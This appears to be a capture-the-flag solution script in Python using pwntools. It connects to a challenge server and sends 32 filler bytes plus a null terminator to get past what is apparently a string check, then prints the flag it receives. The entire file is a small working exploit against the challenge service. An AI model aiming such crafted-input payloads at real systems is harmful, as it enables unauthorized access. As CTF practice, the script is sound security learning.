from pwn import *

# put a null-terminator in the 33rd position
payload = bytes('a' * 32 + '\0', 'utf-8')

# make connection
tgt = remote('challs.rumble.host', 53921)

# wait for prompt
recieved = tgt.recvuntil('flag: ')

# deliver payload
tgt.sendline(payload)

# recieve the flag
recieved = tgt.recvline()
print('recieved: ' + recieved.decode('utf-8'))
